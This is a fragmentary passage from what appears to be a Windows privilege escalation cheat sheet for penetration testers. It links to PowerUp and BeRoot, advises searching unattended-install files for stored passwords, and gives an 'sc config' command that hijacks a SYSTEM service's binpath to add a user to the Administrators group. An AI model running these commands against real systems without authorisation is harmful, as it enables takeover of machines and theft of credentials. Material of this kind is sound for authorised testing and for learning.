...
If you do not wand to loose time use one of the following projects:
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- https://github.com/AlessandroZ/BeRoot

If you want to learn more about the concepts behind this tools, you can read these two resources and the rest of the page:
- http://www.fuzzysecurity.com/tutorials/16.html
- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

### Unattended installs
Look for files that store cleartext, Base64 encoded or poorly encrypted passwords:
```
...
0. Suppose we can change the path name to the service executable which is running as NT-SYSTEM
```
> sc qc vuln_service
...
or directly
```
> sc config vuln_service binpath= "net localgroup Administrators <user> /add"
```
